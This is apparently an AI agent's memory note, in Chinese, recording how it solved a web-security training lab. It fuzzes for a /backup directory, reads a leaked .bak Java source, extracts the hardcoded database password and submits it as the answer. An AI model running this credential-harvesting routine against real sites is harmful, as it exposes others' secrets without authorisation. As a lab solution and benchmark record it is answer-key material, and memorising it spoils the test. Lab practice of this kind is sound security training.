---
metadata:
  node_type: memory
name: "PRS arm A lab-infoleak-via-backup-files"
description: "arm A 基线:lab-infoleak-via-backup-files 冷实例一次通过 - /backup 目录列表 → ProductTemplate.java.bak 泄 DB 口令 → submitSolution answer → banner solved"
last_updated: 2026-10-09T06:52:08+08:00
created: 2026-10-09T06:52:08+08:00
---

## 2026-10-09 - arm A 基线(lab-infoleak-via-backup-files)一次通过

实例:`range_launch launch-url /web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files`(jar /tmp/cj1.json,reused:false)。

链条:
1. `url_fuzz https://<实例>/FUZZ --values backup,backup/,robots.txt,backup/ProductTemplate.java.bak,backup/ProductTemplate.java,admin --marker password` 一次扫出 `/backup`(200,435B,目录索引)与 `/backup/ProductTemplate.java.bak`(200,1667B,text/plain);`.java`、`/admin` 均 404。
2. GET `/backup/` 目录列表确认唯一文件 `ProductTemplate.java.bak`。
3. 读备份源:JDBC 构建参数 `postgres / postgres / yt81f3djmvzxc08jejok21nvsclpsmyp`(localhost:5432)。
4. POST `/submitSolution` `answer=yt81f3djmvzxc08jejok21nvsclpsmyp` → `{"correct":true}`。
5. `banner_verdict` → solved:true + `Congratulations, you solved the lab!`

要点:
- 本题是「提交答案型」:横幅按钮自带 `submitSolution/answer` 线索,泄出的 DB 口令即答案,无需登录管理员。
- 路径本身 200 即可(目录索引给文件名),不必猜备份命名;注意 `.bak` 后缀是唯一形,`.java` 无。
- 全程走件(rs_search 命中 url_fuzz/http_session/banner_verdict),无解释器通道。

